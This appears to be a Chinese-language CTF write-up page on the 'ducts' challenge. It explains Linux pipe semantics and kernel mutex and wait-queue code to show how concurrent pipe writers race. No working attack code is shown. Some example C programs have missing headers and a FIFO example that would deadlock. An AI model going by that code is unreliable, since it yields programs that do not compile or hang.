@@ -1,0 +1,1140 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>管道竞争 - m0leCon CTF Teaser 2025 - ducts · Y0uYuGe</title>
+<meta name="description" content="pipe(7) 是介绍管道和命名管道（FIFO）的 Linux 手册页。管道提供单向进程间通信（IPC）通道，包含读端和写端：数据从写端写入，从读端读取。;while0// 提示编译器此函数可能休眠/**//**//**/// 清除所有者信息#endifmutex_init：初始化互斥锁，确保处于未锁定状态。mutex_lock。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2025/%E7%AE%A1%E9%81%93%E7%AB%9E%E4%BA%89%20-%20m0leCon%20CTF%20Teaser%202025%20-%20ducts" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2025">2025 年</a></nav>
+    <h1>管道竞争 - m0leCon CTF Teaser 2025 - ducts</h1>
+    <div class="meta"><time>2024-10-24</time><span class="tag">#1024 Programmers&#39; Day</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<p>本文首发于奇安信攻防社区 <a href="https://forum.butian.net/share/3818">https://forum.butian.net/share/3818</a></p>
+<h1 id="参考资料">参考资料</h1>
+<p><a href="https://man7.org/linux/man-pages/man7/pipe.7.html">pipe(7) — Linux 手册页</a>
+<a href="https://matteoschiff.com/ducts-writeup/">Ducts 题解</a>
+<a href="https://www.cnblogs.com/alantu2018/p/8477339.html">管道读写规则与管道容量、PIPE_BUF</a>
+<a href="https://www.cnblogs.com/gdk-0078/p/5172941.html">Linux 阻塞与等待队列机制</a>
+第一次在用户空间遇到管道竞争，挺有意思，学习一下</p>
+<blockquote>
+<p>衷心感谢 tpus 和 stc4k 师傅的帮助</p>
+</blockquote>
+<h1 id="pipe">pipe</h1>
+<h3 id="概述">概述</h3>
+<p><code>pipe(7)</code> 是 Linux 手册中介绍管道和命名管道（FIFO）的页面。管道提供单向进程间通信（IPC）通道，包含读端和写端。数据写入写端后，可以从读端读出。</p>
+<h3 id="创建管道">创建管道</h3>
+<h4 id="匿名管道">匿名管道</h4>
+<ul>
+<li><p><strong>创建</strong>：</p>
+<ul>
+<li>使用 <code>pipe(2)</code> 系统调用创建。</li>
+<li>调用 <code>pipe(2)</code> 会创建一个新管道，返回两个文件描述符：一个用于读端（通常是 <code>pipefd[0]</code>），另一个用于写端（通常是 <code>pipefd[1]</code>）。</li>
+<li>匿名管道通常用于父子进程间通信。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    int pipefd[2];
+    char buf[100] = &quot;Hello, pipe!&quot;;
+    
+    if (pipe(pipefd) == -1) {
+        perror(&quot;pipe&quot;);
+        return 1;
+    }
+    
+    // 写入数据
+    write(pipefd[1], buf, sizeof(buf));
+    
+    // 读取数据
+    char read_buf[100];
+    ssize_t n = read(pipefd[0], read_buf, sizeof(read_buf));
+    if (n == -1) {
+        perror(&quot;read&quot;);
+        return 1;
+    }
+    
+    read_buf[n] = &#39;\0&#39;;
+    printf(&quot;Read: %s\n&quot;, read_buf);
+    
+    // 关闭文件描述符
+    close(pipefd[0]);
+    close(pipefd[1]);
+    
+    return 0;
+}
+</code></pre>
+</li>
+</ul>
+<h4 id="命名管道fifo">命名管道（FIFO）</h4>
+<ul>
+<li><p><strong>创建</strong>：</p>
+<ul>
+<li>在文件系统中有名称，使用 <code>mkfifo(3)</code> 函数创建。</li>
+<li>调用 <code>mkfifo(3)</code> 时需要指定路径和权限模式。</li>
+<li>使用 <code>open(2)</code> 系统调用打开，可以指定 <code>O_RDONLY</code> 或 <code>O_WRONLY</code> 标志。</li>
+<li>只要文件权限允许，任何进程都可以打开 FIFO。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<pre><code class="language-c">#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    const char *fifo_path = &quot;/tmp/myfifo&quot;;
+    
+    // 创建 FIFO
+    if (mkfifo(fifo_path, 0666) == -1) {
+        perror(&quot;mkfifo&quot;);
+        return 1;
+    }
+    
+    // 打开 FIFO 用于写入
+    int fd = open(fifo_path, O_WRONLY);
+    if (fd == -1) {
+        perror(&quot;open&quot;);
+        return 1;
+    }
+    
+    // 写入数据
+    const char *msg = &quot;Hello, FIFO!&quot;;
+    write(fd, msg, strlen(msg));
+    
+    // 关闭文件描述符
+    close(fd);
+    
+    // 删除 FIFO
+    unlink(fifo_path);
+    
+    return 0;
+}
+</code></pre>
+</li>
+</ul>
+<h3 id="io-操作">I/O 操作</h3>
+<ul>
+<li><p><strong>读写操作</strong>：</p>
+<ul>
+<li><strong>读操作</strong>：<ul>
+<li>如果尝试从空管道读取，<code>read(2)</code> 会阻塞，直到有数据可读。</li>
+<li>如果所有写端都已关闭，<code>read(2)</code> 返回 0，表示文件结束。</li>
+</ul>
+</li>
+<li><strong>写操作</strong>：<ul>
+<li>如果尝试向已满的管道写入，<code>write(2)</code> 会阻塞，直到有足够空间。</li>
+<li>如果所有读端都已关闭，<code>write(2)</code> 产生 <code>SIGPIPE</code> 信号，返回 -1，并将 <code>errno</code> 设为 <code>EPIPE</code>。</li>
+</ul>
+</li>
+<li><strong>非阻塞 I/O</strong>：<ul>
+<li>启用 <code>O_NONBLOCK</code> 标志即可实现非阻塞 I/O，可使用 <code>F_SETFL</code> 操作，通过 <code>fcntl(2)</code> 完成。</li>
+<li>对于 FIFO，如果已有进程打开写端，读操作返回 <code>EAGAIN</code>；否则，如果不存在潜在写入者，读取成功并返回空。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>原子性</strong>：</p>
+<ul>
+<li>写入的数据不超过 <code>PIPE_BUF</code> 字节时，操作具有原子性，即数据作为一个连续序列写入管道。</li>
+<li>写入的数据超过 <code>PIPE_BUF</code> 字节时，可能不具有原子性；内核可能将数据拆成多部分写入管道，其他进程的写入可能穿插其中。</li>
+<li>POSIX.1 要求 <code>PIPE_BUF</code> 至少为 512 字节；Linux 上通常为 4096 字节。</li>
+</ul>
+</li>
+</ul>
+<h3 id="配置选项">配置选项</h3>
+<ul>
+<li><strong>/proc 文件系统</strong>：<ul>
+<li><code>/proc/sys/fs/pipe-max-size</code>：设置管道的最大容量（单位：字节）。</li>
+<li><code>/proc/sys/fs/pipe-user-pages-hard</code>：设置单个非特权用户可分配给管道缓冲区的总页数硬限制。</li>
+<li><code>/proc/sys/fs/pipe-user-pages-soft</code>：设置单个非特权用户可分配给管道缓冲区的总页数软限制。</li>
+</ul>
+</li>
+</ul>
+<h3 id="相关函数与系统调用">相关函数与系统调用</h3>
+<ul>
+<li><p><strong>创建与管理</strong>：</p>
+<ul>
+<li><code>pipe(2)</code>：创建匿名管道。</li>
+<li><code>mkfifo(3)</code>：创建命名管道。</li>
+<li><code>open(2)</code>：打开命名管道。</li>
+<li><code>fcntl(2)</code>：管理文件描述符属性。</li>
+<li><code>dup(2)</code>：复制文件描述符。</li>
+<li><code>close(2)</code>：关闭文件描述符。</li>
+</ul>
+</li>
+<li><p><strong>I/O 操作</strong>：</p>
+<ul>
+<li><code>read(2)</code>：从管道读取数据。</li>
+<li><code>write(2)</code>：向管道写入数据。</li>
+<li><code>poll(2)</code> 和 <code>select(2)</code>：监视多个文件描述符的状态。</li>
+<li><code>splice(2)</code> 和 <code>tee(2)</code>：高效传输数据。</li>
+<li><code>vmsplice(2)</code>：将用户空间内存区域的内容写入管道。</li>
+</ul>
+</li>
+<li><p><strong>其他</strong>：</p>
+<ul>
+<li><code>stat(2)</code>：获取文件状态。</li>
+<li><code>unlink(2)</code>：删除文件。</li>
+<li><code>epoll(7)</code>：高效的 I/O 多路复用机制。</li>
+<li><code>fifo(7)</code>：命名管道的详细说明。</li>
+</ul>
+</li>
+</ul>
+<h3 id="通信语义">通信语义</h3>
+<ul>
+<li><strong>字节流</strong>：<ul>
+<li>管道提供的通信通道是字节流，没有消息边界的概念。</li>
+<li>数据按顺序写入和读取，但没有明确的消息分隔符。</li>
+</ul>
+</li>
+</ul>
+<h3 id="示例代码">示例代码</h3>
+<h4 id="匿名管道示例">匿名管道示例</h4>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    int pipefd[2];
+    pid_t cpid;
+    char buf[100];
+
+    if (pipe(pipefd) == -1) {
+        perror(&quot;pipe&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    cpid = fork();
+    if (cpid == -1) {
+        perror(&quot;fork&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    if (cpid == 0) {    // 子进程
+        close(pipefd[1]); // 关闭写端
+        ssize_t n = read(pipefd[0], buf, sizeof(buf));
+        if (n == -1) {
+            perror(&quot;read&quot;);
+            exit(EXIT_FAILURE);
+        }
+        buf[n] = &#39;\0&#39;;
+        printf(&quot;Child: received &#39;%s&#39;\n&quot;, buf);
+        close(pipefd[0]);
+        exit(EXIT_SUCCESS);
+    } else {            // 父进程
+        close(pipefd[0]); // 关闭读端
+        const char *msg = &quot;Hello, child!&quot;;
+        write(pipefd[1], msg, strlen(msg));
+        close(pipefd[1]);
+        wait(NULL);     // 等待子进程结束
+        exit(EXIT_SUCCESS);
+    }
+}
+</code></pre>
+<h4 id="命名管道示例">命名管道示例</h4>
+<pre><code class="language-c">#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    const char *fifo_path = &quot;/tmp/myfifo&quot;;
+
+    // 创建 FIFO
+    if (mkfifo(fifo_path, 0666) == -1) {
+        perror(&quot;mkfifo&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    // 父进程写入数据
+    int fd = open(fifo_path, O_WRONLY);
+    if (fd == -1) {
+        perror(&quot;open&quot;);
+        exit(EXIT_FAILURE);
+    }
+    const char *msg = &quot;Hello, FIFO!&quot;;
+    write(fd, msg, strlen(msg));
+    close(fd);
+
+    // 子进程读取数据
+    pid_t cpid = fork();
+    if (cpid == -1) {
+        perror(&quot;fork&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    if (cpid == 0) {    // 子进程
+        fd = open(fifo_path, O_RDONLY);
+        if (fd == -1) {
+            perror(&quot;open&quot;);
+            exit(EXIT_FAILURE);
+        }
+        char buf[100];
+        ssize_t n = read(fd, buf, sizeof(buf));
+        if (n == -1) {
+            perror(&quot;read&quot;);
+            exit(EXIT_FAILURE);
+        }
+        buf[n] = &#39;\0&#39;;
+        printf(&quot;Child: received &#39;%s&#39;\n&quot;, buf);
+        close(fd);
+        exit(EXIT_SUCCESS);
+    } else {            // 父进程
+        wait(NULL);     // 等待子进程结束
+        unlink(fifo_path); // 删除 FIFO
+        exit(EXIT_SUCCESS);
+    }
+}
+</code></pre>
+<h3 id="参考资料-1">参考资料</h3>
+<ul>
+<li><code>fcntl(2)</code></li>
+<li><code>intro(2)</code></li>
+<li><code>open(2)</code></li>
+<li><code>pipe(2)</code></li>
+<li><code>splice(2)</code></li>
+<li><code>tee(2)</code></li>
+<li><code>vmsplice(2)</code></li>
+<li><code>write(2)</code></li>
+<li><code>proc_sys_fs(5)</code></li>
+<li><code>fifo(7)</code></li>
+<li><code>signal(7)</code></li>
+</ul>
+<h1 id="竞争点">竞争点</h1>
+<p><a href="https://xie.infoq.cn/article/c2bdf20841b48d407b1485c9a">任意只读文件漏洞分析</a>
+位于 pipe_write 中</p>
+<p>大致来说：第一个进程向管道写入并释放锁后，其他进程依次开始写入，但都会像第一个进程一样，阻塞在 wait_event_interruptible_exclusive，之后才轮到读进程读取。读取结束后，各进程的 wait_event_interruptible_exclusive 返回，再获取锁并继续写入。</p>
+<p>因此，谁先写入，取决于谁从退出 wait_event_interruptible_exclusive 到获得锁的速度更快</p>
+<p>下面详细分析</p>
+<h2 id="互斥锁">互斥锁</h2>
+<p>下面详细说明 <code>mutex_init</code>、<code>mutex_lock</code> 和 <code>mutex_unlock</code> 的作用及内部机制。</p>
+<h3 id="1-mutex_init">1. <code>mutex_init</code></h3>
+<h4 id="定义">定义</h4>
+<pre><code class="language-c">#define mutex_init(mutex) \
+do {							\
+	static struct lock_class_key __key;		\
+								\
+	__mutex_init((mutex), #mutex, &amp;__key);		\
+} while (0)
+</code></pre>
+<h4 id="用途">用途</h4>
+<p><code>mutex_init</code> 用于初始化互斥锁，确保它处于未锁定状态，准备好供后续使用。</p>
+<h4 id="实现">实现</h4>
+<pre><code class="language-c">void __mutex_init(struct mutex *lock, const char *name, struct lock_class_key *key)
+{
+	atomic_set(&amp;lock-&gt;count, 1); // 将计数器设置为1，表示未锁定
+	spin_lock_init(&amp;lock-&gt;wait_lock); // 初始化自旋锁，用于保护等待队列
+	INIT_LIST_HEAD(&amp;lock-&gt;wait_list); // 初始化等待队列
+	mutex_clear_owner(lock); // 清除所有者信息
+#ifdef CONFIG_MUTEX_SPIN_ON_OWNER
+	lock-&gt;spin_mlock = NULL; // 初始化自旋锁指针（如果启用了相关配置）
+#endif
+ 
+	debug_mutex_init(lock, name, key); // 调试信息初始化
+}
+</code></pre>
+<h4 id="工作原理">工作原理</h4>
+<ul>
+<li><strong>初始化计数器</strong>：<code>atomic_set(&amp;lock-&gt;count, 1)</code> 将互斥锁计数器设为 1，表示尚未锁定。</li>
+<li><strong>初始化自旋锁</strong>：<code>spin_lock_init(&amp;lock-&gt;wait_lock)</code> 初始化用于保护等待队列的自旋锁。</li>
+<li><strong>初始化等待队列</strong>：<code>INIT_LIST_HEAD(&amp;lock-&gt;wait_list)</code> 初始化链表头，用于管理等待获取互斥锁的任务。</li>
+<li><strong>清除所有者信息</strong>：<code>mutex_clear_owner(lock)</code> 清除互斥锁的所有者信息。</li>
+<li><strong>初始化调试信息</strong>：<code>debug_mutex_init(lock, name, key)</code> 用于调试，记录互斥锁的名称和类键。</li>
+</ul>
+<h3 id="2-mutex_lock">2. <code>mutex_lock</code></h3>
+<h4 id="定义-1">定义</h4>
+<pre><code class="language-c">void __sched mutex_lock(struct mutex *lock)
+{
+	might_sleep(); // 提示编译器该函数可能会睡眠
+	/*
+	 * The locking fastpath is the 1-&gt;0 transition from
+	 * &#39;unlocked&#39; into &#39;locked&#39; state.
+	 */
+	__mutex_fastpath_lock(&amp;lock-&gt;count, __mutex_lock_slowpath);
+	mutex_set_owner(lock);
+}
+</code></pre>
+<h4 id="用途-1">用途</h4>
+<p><code>mutex_lock</code> 用于获取互斥锁。如果锁已被其他任务持有，当前任务会休眠，直到锁可用。</p>
+<h4 id="实现-1">实现</h4>
+<ul>
+<li><strong>提示可能休眠</strong>：<code>might_sleep()</code> 向编译器提示该函数可能休眠，确保调用者不会在禁止休眠的上下文中调用该函数。</li>
+<li><strong>快速路径</strong>：<code>__mutex_fastpath_lock(&amp;lock-&gt;count, __mutex_lock_slowpath)</code> 尝试快速获取互斥锁。如果锁未被持有，直接将计数器从 1 减到 0，表示已锁定；如果锁已被持有，则调用慢速路径 <code>__mutex_lock_slowpath</code>。</li>
+<li><strong>设置所有者</strong>：<code>mutex_set_owner(lock)</code> 将互斥锁的所有者设为当前任务。</li>
+</ul>
+<h4 id="工作原理-1">工作原理</h4>
+<ul>
+<li><strong>快速路径</strong>：尝试以原子操作将计数器从 1 减到 0。如果成功，表示当前任务已获取互斥锁。</li>
+<li><strong>慢速路径</strong>：如果快速路径失败（即锁已被其他任务持有），则调用 <code>__mutex_lock_slowpath</code>。慢速路径将当前任务加入等待队列，并使其休眠，直到互斥锁可用。</li>
+<li><strong>设置所有者</strong>：确保互斥锁的所有者信息正确设置为当前任务。</li>
+</ul>
+<h3 id="3-mutex_unlock">3. <code>mutex_unlock</code></h3>
+<h4 id="定义-2">定义</h4>
+<pre><code class="language-c">void __sched mutex_unlock(struct mutex *lock)
+{
+	/*
+	 * The unlocking fastpath is the 0-&gt;1 transition from &#39;locked&#39;
+	 * into &#39;unlocked&#39; state:
+	 */
+#ifndef CONFIG_DEBUG_MUTEXES
+	/*
+	 * When debugging is enabled we must not clear the owner before time,
+	 * the slow path will always be taken, and that clears the owner field
+	 * after verifying that it was indeed current.
+	 */
+	mutex_clear_owner(lock); // 清除所有者信息
+#endif
+	__mutex_fastpath_unlock(&amp;lock-&gt;count, __mutex_unlock_slowpath);
+}
+</code></pre>
+<h4 id="用途-2">用途</h4>
+<p><code>mutex_unlock</code> 用于释放互斥锁。只有当前任务持有该锁时，才能调用这个函数释放它。</p>
+<h4 id="实现-2">实现</h4>
+<ul>
+<li><strong>清除所有者信息</strong>：<code>mutex_clear_owner(lock)</code> 清除互斥锁的所有者信息。 如果启用调试模式，则在慢速路径中执行该操作。</li>
+<li><strong>快速路径</strong>：<code>__mutex_fastpath_unlock(&amp;lock-&gt;count, __mutex_unlock_slowpath)</code> 尝试快速释放互斥锁。如果锁由当前任务持有，则直接将计数器从 0 加到 1，表示已解锁；如果不是当前任务持有，则调用慢速路径 <code>__mutex_unlock_slowpath</code>。</li>
+</ul>
+<h4 id="工作原理-2">工作原理</h4>
+<ul>
+<li><strong>快速路径</strong>：尝试以原子操作将计数器从 0 加到 1。如果成功，表示互斥锁已解锁。</li>
+<li><strong>慢速路径</strong>：如果快速路径失败（即锁并非由当前任务持有），则调用 <code>__mutex_unlock_slowpath</code>。慢速路径验证互斥锁所有者信息，并唤醒等待队列中的下一个任务。</li>
+<li><strong>清除所有者信息</strong>：确保正确清除互斥锁的所有者信息，使其他任务能够获取锁。</li>
+</ul>
+<h3 id="总结">总结</h3>
+<ul>
+<li><strong><code>mutex_init</code></strong>：初始化互斥锁，确保处于未锁定状态。</li>
+<li><strong><code>mutex_lock</code></strong>：获取互斥锁；如果锁已被其他任务持有，当前任务会休眠，直到锁可用。</li>
+<li><strong><code>mutex_unlock</code></strong>：释放互斥锁；只有当前任务持有该锁时，才能调用此函数释放它。</li>
+</ul>
+<h2 id="pipe_read">pipe_read</h2>
+<p>读进程先启动，此时尚未写入任何内容。在 <code>pipe_read</code> 函数中，如果管道里没有可读内容，就会进入相应的处理流程。具体流程如下：</p>
+<h3 id="1-初始状态检查">1. <strong>初始状态检查</strong></h3>
+<p>首先，函数锁定管道的互斥锁（<code>mutex_lock(&amp;pipe-&gt;mutex)</code>），检查管道的头尾指针，判断管道是否为空。以下代码执行这项检查：</p>
+<pre><code class="language-c">unsigned int head = smp_load_acquire(&amp;pipe-&gt;head);
+unsigned int tail = pipe-&gt;tail;
+</code></pre>
+<p>随后判断以下条件：</p>
+<pre><code class="language-c">if (!pipe_empty(head, tail)) {
+    // 管道不为空的情况，处理读取
+} else {
+    // 管道为空的情况
+}
+</code></pre>
+<p>如果管道为空，<code>pipe_empty(head, tail)</code> 返回 <code>true</code>，执行流程进入“管道为空”的处理逻辑。</p>
+<h3 id="2-检查是否存在写入者">2. <strong>检查是否存在写入者</strong></h3>
+<p>接着，检查是否仍有写入者向管道写入：</p>
+<pre><code class="language-c">if (!pipe-&gt;writers)
+    break;
+</code></pre>
+<ul>
+<li>如果没有写入者（<code>pipe-&gt;writers == 0</code>），就不会再有数据写入，因此直接跳出循环，函数返回。</li>
+<li>如果存在写入者，则继续执行。（通常存在。）</li>
+</ul>
+<h3 id="3-处理非阻塞模式">3. <strong>处理非阻塞模式</strong></h3>
+<p>阻塞与非阻塞模式的行为不同。接下来检查文件描述符标志：</p>
+<pre><code class="language-c">if ((filp-&gt;f_flags &amp; O_NONBLOCK) || (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)) {
+    ret = -EAGAIN;
+    break;
+}
+</code></pre>
+<ul>
+<li>如果文件描述符设置了 <code>O_NONBLOCK</code> 标志（非阻塞模式），或 <code>iocb</code> 结构体设置了 <code>IOCB_NOWAIT</code> 标志，<code>pipe_read</code> 会立即返回 <code>-EAGAIN</code>，表示当前没有可读数据，且不会等待。（通常为阻塞模式。）</li>
+<li>如果为阻塞模式，则继续等待数据。</li>
+</ul>
+<h3 id="4-解锁并等待数据">4. <strong>解锁并等待数据</strong></h3>
+<p>在阻塞模式下，如果管道为空，程序会解开互斥锁，进入等待状态：</p>
+<pre><code class="language-c">mutex_unlock(&amp;pipe-&gt;mutex);
+</code></pre>
+<p>随后调用 <code>wait_event_interruptible_exclusive</code> 等待数据：</p>
+<pre><code class="language-c">if (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; 0)
+    return -ERESTARTSYS;
+</code></pre>
+<ul>
+<li><code>wait_event_interruptible_exclusive</code> 使当前进程休眠，直到管道变为可读（即有数据写入），或进程被信号（如 <code>SIGINT</code>）中断。</li>
+<li>如果被信号中断，函数返回 <code>-ERESTARTSYS</code>，告知调用者需要重启系统调用。</li>
+<li>如果管道变为可读（即已有数据写入），函数会再次尝试读取数据。</li>
+</ul>
+<h3 id="5-重新获取互斥锁并再次检查">5. <strong>重新获取互斥锁并再次检查</strong></h3>
+<p>等待结束后，函数重新获取管道的互斥锁：</p>
+<pre><code class="language-c">mutex_lock(&amp;pipe-&gt;mutex);
+</code></pre>
+<p>然后进入循环，再次检查管道状态，重新判断是否有数据可读。如果此时管道中有数据，就进入读取流程。</p>
+<h2 id="同时启动多个-pipe_write">同时启动多个 pipe_write</h2>
+<p>此时由于只有一个进程能成功获取锁，其余进程都进入互斥锁等待队列，但顺序未知。随后，当管道缓冲区被填满时，会进入以下流程：</p>
+<pre><code class="language-c">  mutex_unlock(&amp;pipe-&gt;mutex);
+		if (was_empty)
+			wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);
+		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);
+		wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));
+		mutex_lock(&amp;pipe-&gt;mutex);
+		was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);
+		wake_next_writer = true;
+	}
+</code></pre>
+<p>此时解锁会使其他进程开始获取锁，并向阻塞的 pipe_read 读进程发送唤醒信号。由于管道缓冲区已满，其他 pipe_write 进程仍会进入上述相同流程</p>
+<p>但第一个 pipe_write 进程释放锁后，互斥锁等待队列中已有其他 pipe_write 进程，因此其他 pipe_write 进程先获取锁。此时，第一个 pipe_write 进程通过 <code>wake_up_interruptible_sync_poll</code> 唤醒 pipe_read 读进程；pipe_read 随后尝试加锁，但锁已被占用，因此进入互斥锁等待队列，排在 pipe_write 进程后面。随后，第一个 pipe_write 将自身加入等待队列，直到收到管道可写的信号</p>
+<p>此时，其他 pipe_write 进程也会依次执行到 <code>wait_event_interruptible_exclusive</code>，将自身加入等待队列。</p>
+<pre><code class="language-c">if (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; 0)
+			return -ERESTARTSYS;
+
+		mutex_lock(&amp;pipe-&gt;mutex);
+		was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);
+		wake_next_reader = true;
+	}
+</code></pre>
+<h2 id="pipe_read-读取后唤醒-pipe_write">pipe_read 读取后唤醒 pipe_write</h2>
+<pre><code class="language-c">	}
+	if (pipe_empty(pipe-&gt;head, pipe-&gt;tail))
+		wake_next_reader = false;
+	mutex_unlock(&amp;pipe-&gt;mutex);
+
+	if (was_full)
+		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);
+	if (wake_next_reader)
+		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);
+	kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);
+	if (ret &gt; 0)
+		file_accessed(filp);
+	return ret;
+}
+</code></pre>
+<p>通过 <code>wake_up_interruptible_sync_poll</code> 唤醒 pipe_write 时，唤醒及加入等待队列的机制如下</p>
+<h3 id="加入等待队列">加入等待队列</h3>
+<ol>
+<li><p><strong>创建等待队列项</strong>：</p>
+<ul>
+<li>调用 <code>wait_event_interruptible_exclusive()</code> 时，会初始化 <code>wait_queue_entry</code> 结构体。此操作通过 <code>init_wait_entry()</code> 完成。</li>
+<li><code>flags</code> 字段标记 <code>wait_queue_entry</code> 是否为独占等待项。</li>
+<li><code>private</code> 字段通常设置为当前进程（<code>current</code>），表示正在等待的任务。</li>
+</ul>
+</li>
+<li><p><strong>插入等待队列</strong>：</p>
+<ul>
+<li><code>prepare_to_wait_event()</code> 函数将 <code>wait_queue_entry</code> 插入 <code>wait_queue_head</code> 链表。</li>
+<li>如果是独占等待，将队列项添加到队尾；非独占等待则添加到队首。</li>
+<li>将当前任务状态设为 <code>TASK_INTERRUPTIBLE</code>（使用 <code>wait_event_interruptible_exclusive</code> 时）或 <code>TASK_UNINTERRUPTIBLE</code>。</li>
+</ul>
+</li>
+</ol>
+<h3 id="唤醒机制">唤醒机制</h3>
+<p>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM); 唤醒 wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe)); 时，__wake_up_common 的执行流程</p>
+<pre><code class="language-c">#define wake_up_interruptible_sync_poll(x, m)					\
+	__wake_up_sync_key((x), TASK_INTERRUPTIBLE, poll_to_key(m))
+	
+void __wake_up_sync_key(struct wait_queue_head *wq_head, unsigned int mode,
+			void *key)
+{
+	if (unlikely(!wq_head))
+		return;
+
+	__wake_up_common_lock(wq_head, mode, 1, WF_SYNC, key);
+}
+EXPORT_SYMBOL_GPL(__wake_up_sync_key);
+
+static int __wake_up_common_lock(struct wait_queue_head *wq_head, unsigned int mode,
+			int nr_exclusive, int wake_flags, void *key)
+{
+	unsigned long flags;
+	int remaining;
+
+	spin_lock_irqsave(&amp;wq_head-&gt;lock, flags);
+	remaining = __wake_up_common(wq_head, mode, nr_exclusive, wake_flags,
+			key);
+	spin_unlock_irqrestore(&amp;wq_head-&gt;lock, flags);
+
+	return nr_exclusive - remaining;
+}
+
+static int __wake_up_common(struct wait_queue_head *wq_head, unsigned int mode,
+			int nr_exclusive, int wake_flags, void *key)
+{
+	wait_queue_entry_t *curr, *next;
+
+	lockdep_assert_held(&amp;wq_head-&gt;lock);
+
+	curr = list_first_entry(&amp;wq_head-&gt;head, wait_queue_entry_t, entry);
+
+	if (&amp;curr-&gt;entry == &amp;wq_head-&gt;head)
+		return nr_exclusive;
+
+	list_for_each_entry_safe_from(curr, next, &amp;wq_head-&gt;head, entry) {
+		unsigned flags = curr-&gt;flags;
+		int ret;
+
+		ret = curr-&gt;func(curr, mode, wake_flags, key);
+		if (ret &lt; 0)
+			break;
+		if (ret &amp;&amp; (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive)
+			break;
+	}
+
+	return nr_exclusive;
+}
+</code></pre>
+<p>Linux 内核通过等待队列管理任务的休眠和唤醒。当多个任务在同一等待队列上独占等待时（例如使用 <code>wait_event_interruptible_exclusive</code>），唤醒机制会按照一定策略唤醒任务。</p>
+<h3 id="独占等待的唤醒策略">独占等待的唤醒策略</h3>
+<ol>
+<li><p><strong>队列顺序</strong>：</p>
+<ul>
+<li>等待队列内部通常是链表结构，任务按进入顺序排列。最先进入的任务在链表头部，最后进入的在尾部。</li>
+</ul>
+</li>
+<li><p><strong>唤醒顺序</strong>：</p>
+<ul>
+<li><code>__wake_up_common</code> 函数遍历等待队列时，从队首（即最早进入的任务）开始检查和唤醒。因此，通常首先唤醒最早进入等待队列的独占任务。</li>
+</ul>
+</li>
+<li><p><strong>独占标志</strong>：</p>
+<ul>
+<li>每个等待队列项都包含标志，表示任务是否独占等待（通过 <code>WQ_FLAG_EXCLUSIVE</code> 标志）。</li>
+<li>在 <code>__wake_up_common</code> 中，成功唤醒一个独占任务后，<code>nr_exclusive</code> 计数器递减。</li>
+<li>一旦 <code>nr_exclusive</code> 变为零，唤醒过程停止，即只唤醒指定数量的独占任务，而不是全部等待任务。</li>
+</ul>
+</li>
+</ol>
+<h3 id="具体唤醒哪个任务">具体唤醒哪个任务</h3>
+<ul>
+<li><strong>第一个独占任务</strong>：多个任务等待时，唤醒机制首先唤醒队列中第一个带独占标志的任务。</li>
+<li><strong>FIFO 顺序</strong>：由于队列按 FIFO（先进先出）顺序管理，首先唤醒的独占任务通常是最早调用 <code>wait_event_interruptible_exclusive</code> 并加入队列的任务。</li>
+</ul>
+<p>此时，哪个 pipe_write 进程先触发 <code>wait_event_interruptible_exclusive</code> 并加入等待队列是不确定的：最先解锁的 pipe_write 随后触发 <code>wait_event_interruptible_exclusive</code>，与其他进程获取锁、解锁后再触发 <code>wait_event_interruptible_exclusive</code>，两者的先后顺序不确定。自然，最先唤醒哪个 pipe_write 进程也不确定</p>
+<p>但如果其他 pipe_write 进程比最先解锁的 pipe_write 更早触发 <code>wait_event_interruptible_exclusive</code>，下一个开始写入的就不会是原来那个 pipe_write 进程</p>
